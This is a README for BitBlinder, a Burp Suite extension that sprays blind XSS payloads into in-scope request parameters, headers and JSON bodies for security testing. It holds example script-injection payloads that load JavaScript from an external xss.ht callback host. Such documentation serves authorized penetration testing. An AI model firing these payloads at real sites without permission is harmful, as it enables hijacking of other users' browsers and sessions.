# BitBlinder

**Release 0.6**  
Burp Suite extension for blind XSS discovery by injecting payloads into **in-scope** requests.

```
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
-  Developer: Ahmed Ezzat (BitTheByte)      -
-  Github:    https://github.com/BitTheByte -
-  Version:   0.6                           -
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
[WARNING] MAKE SURE TO EDIT THE SETTINGS BEFORE USE
[WARNING] THIS TOOL WILL WORK FOR IN-SCOPE ITEMS ONLY
[WARNING] THIS TOOL WILL CONSUME TOO MUCH BANDWIDTH
```

## Highlights
- Injects into URL and body parameters.
- Optional header injection with a custom header list.
- JSON body support with “string values only” mode.
- Exclusions by host, path prefix, or parameter name.
- Per-host rate limiting.
- Activity table + status updates + scope indicator.
- Payload template picker and inline validation warnings.

## Requirements
- Burp Suite
- Jython (for Python extensions)

## Install
1. Open Burp Suite → Extender → Extensions.
2. Add `blinder.py` as a Python extension.

## Quick start
1. Open the **Bit blinder** tab and enable scanning.
2. Add at least one payload (line separated).
3. Ensure your target is **in scope** (Target → Scope).
4. Browse the app normally.
5. Watch the Activity table/status for injections.

## Configuration
### Payloads
Line-separated payloads. If randomization is off, only the first payload is used.

Example:
```
"><script%20src="https://myusername.xss.ht"></script>
"><script%20src="https://$(uuid).xss.ht"></script>
```
You can also insert common payloads using the template picker in the UI.

#### Placeholder
- `$(uuid)` is replaced with a fresh random UUID **for each injection**.

#### Encoding note
Payloads are **not** auto-encoded. If your target expects URL-encoding, include it in the payload.

### Options
- **Randomize payloads**: choose a random payload per injection.
- **Auto-encode payloads for URL/body**: default on; disable to insert raw payloads.
- **Inject headers**: inject payloads into header names you specify.
- **Inject JSON body**: inject into JSON request bodies.
- **JSON: only replace string values**: skip non-strings when injecting JSON.
- **Exclusions**:
  - Hosts: exact or subdomain match.
  - Paths: prefix match.
  - Params: exact name match.
- **Rate limit**: throttle background injection requests (ms) per host.
- **Verbose activity**: shows payload details in the status line.

### Storage
Settings are stored using Burp’s extension storage (no config file).

## How it works (example)
When a user visits:

`https://example.com?vuln=123&vuln2=abc`

BitBlinder sends (in the background):
1. `https://example.com?vuln=[YOUR_XSS_PAYLOAD]&vuln2=abc`
2. `https://example.com?vuln=123&vuln2=[YOUR_XSS_PAYLOAD]`

The same logic applies to `POST` parameters and JSON bodies (if enabled).

## Notes
- This tool can generate a lot of traffic. You may hit rate limits or WAF blocks.
- It **only** runs on in-scope targets.
- Requests are sent through Burp’s HTTP engine and added to the Site Map.

## Troubleshooting
- **No activity shown**: Ensure the target is in scope and the extension is enabled.
- **No injections**: Add at least one payload and click **Save**.
- **JSON not injected**: Enable “Inject JSON body” and verify valid JSON payloads.
